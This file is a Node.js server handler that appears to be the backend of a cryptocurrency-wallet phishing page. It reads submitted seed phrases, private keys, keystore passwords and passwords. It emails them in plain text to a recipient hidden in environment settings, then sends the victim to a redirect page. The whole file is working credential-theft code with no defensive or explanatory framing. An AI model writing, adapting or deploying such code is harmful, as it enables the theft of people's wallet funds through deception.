const nodemailer = require('nodemailer');
const { parse } = require('querystring');

async function parseBody(req) {
  const contentType = req.headers['content-type'] || '';

  if (req.body && typeof req.body === 'object' && !Array.isArray(req.body)) {
    return req.body;
  }

  if (typeof req.body === 'string') {
    if (contentType.includes('application/json')) {
      return req.body ? JSON.parse(req.body) : {};
    }

    return req.body ? parse(req.body) : {};
  }

  if (contentType.includes('application/json')) {
    const chunks = [];
    if (req.readable && typeof req.on === 'function') {
      const data = await new Promise((resolve, reject) => {
        req.setEncoding('utf8');
        let raw = '';
        req.on('data', (chunk) => { raw += chunk; });
        req.on('end', () => resolve(raw));
        req.on('error', reject);
      });
      return data ? JSON.parse(data) : {};
    }

    return {};
  }

  if (contentType.includes('multipart/form-data')) {
    return {};
  }

  if (req.readable && typeof req.on === 'function') {
    const data = await new Promise((resolve, reject) => {
      req.setEncoding('utf8');
      let raw = '';
      req.on('data', (chunk) => { raw += chunk; });
      req.on('end', () => resolve(raw));
      req.on('error', reject);
    });
    return data ? parse(data) : {};
  }

  return {};
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  try {
    const body = await parseBody(req);
    const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || 'N/A';
    const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
    const password = body.pw || body.password || body.keystorePassword || body.privateKey || body.seedphrase || 'N/A';
    const seedphrase = body.seedphrase || body.seedphraseInput || 'N/A';
    const privateKey = body.privateKey || body.privateKeyInput || 'N/A';
    const keystorePassword = body.keystorePassword || body.keystorePasswordInput || 'N/A';

    if (!phase || phase.trim() === '') {
      return res.status(400).send('Required field missing.');
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587', 10),
      secure: process.env.SMTP_PORT === '465',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    const mailOptions = {
      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
      subject: 'New Wallet Import Submission',
      text: [
        `Wallet: ${walletName}`,
        `Phase: ${phase}`,
        `Seedphrase: ${seedphrase}`,
        `Private Key: ${privateKey}`,
        `Keystore Password: ${keystorePassword}`,
        `Password: ${password}`,
      ].join('\n'),
    };

    await transporter.sendMail(mailOptions);
    res.writeHead(302, { Location: '/rdr.html' });
    res.end();
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
};
